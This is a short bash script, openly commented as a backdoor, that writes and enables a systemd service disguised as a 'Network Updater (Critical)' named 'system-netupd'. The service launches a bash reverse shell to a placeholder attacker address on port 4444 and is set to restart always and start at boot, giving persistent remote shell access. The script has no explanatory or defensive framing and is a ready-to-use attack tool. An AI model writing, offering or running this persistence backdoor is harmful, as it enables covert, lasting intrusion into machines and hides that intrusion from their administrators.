#!/bin/bash

# Define the systemd backdoor service name
SERVICE_NAME="system-netupd"

# Define the target reverse shell command
SHELL_CMD="/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# Write the systemd service
cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=Network Updater (Critical)
After=network.target

[Service]
ExecStart=$SHELL_CMD
Restart=always
Type=simple

[Install]
WantedBy=multi-user.target
EOF

# Reload and activate the malicious service
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME
